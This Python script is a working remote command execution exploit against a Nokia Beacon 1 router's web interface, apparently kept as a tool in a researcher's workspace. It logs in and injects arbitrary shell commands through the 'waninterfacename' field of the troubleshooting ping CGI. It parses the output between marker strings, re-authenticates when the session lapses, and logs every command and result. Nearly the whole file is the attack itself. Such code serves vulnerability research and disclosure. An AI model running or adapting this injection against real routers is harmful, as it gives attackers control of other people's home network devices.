#!/usr/bin/env python3
import sys, urllib.parse, os, time, json
sys.path.insert(0, '/home/jarrettgxz/nokia-beacon1/work/tools')
from nokia import Nokia

B = "__BEG__"
E = "__END__"
LOG = '/home/jarrettgxz/nokia-beacon1/work/logs/session.log'

class RCE:
    def __init__(self):
        self.n = Nokia()
        self.login()
    def login(self):
        if not self.n.login():
            raise SystemExit("LOGIN FAILED")
    def _post(self, cmd):
        wrapped = "echo %s\n%s\necho %s" % (B, cmd, E)
        inj = "\n" + wrapped + "\n"
        body = urllib.parse.urlencode({
            'wan_conlist':'2','ipaddress':'127.0.0.1','direction':'rx','status':'enable',
            'domain':'','wan_port':'WAN','waninterfacename':inj,'portstatus':'Disconnected',
            'lan_port':'null','csrf_token':self.n.token})
        st, hd, rb = self.n.post('/troubleshooting_web_app.cgi?ping', body)
        return st, rb.decode('utf-8','replace')
    def run(self, cmd, retry=True):
        st, t = self._post(cmd)
        i = t.find(B); j = t.find(E, i+1)
        if i < 0 or j < 0:
            # maybe session expired -> re-login and retry once
            if retry:
                try:
                    self.login()
                    return self.run(cmd, retry=False)
                except SystemExit:
                    pass
            return "ERR st=%s len=%d tail=%r" % (st, len(t), t[-300:])
        out = t[i+len(B):j]
        out = out[1:] if out.startswith('\n') else out
        return out.rstrip('\n')

def logcmd(cmd, out):
    with open(LOG,'a') as f:
        f.write("\n===== CMD: %s =====\n" % cmd)
        f.write(out + "\n")

if __name__ == '__main__':
    r = RCE()
    cmds = sys.argv[1:]
    if not cmds:
        cmds = [l for l in sys.stdin.read().split('\n') if l.strip()]
    for c in cmds:
        out = r.run(c)
        print("### CMD:", c)
        print(out)
        print()
        logcmd(c, out)
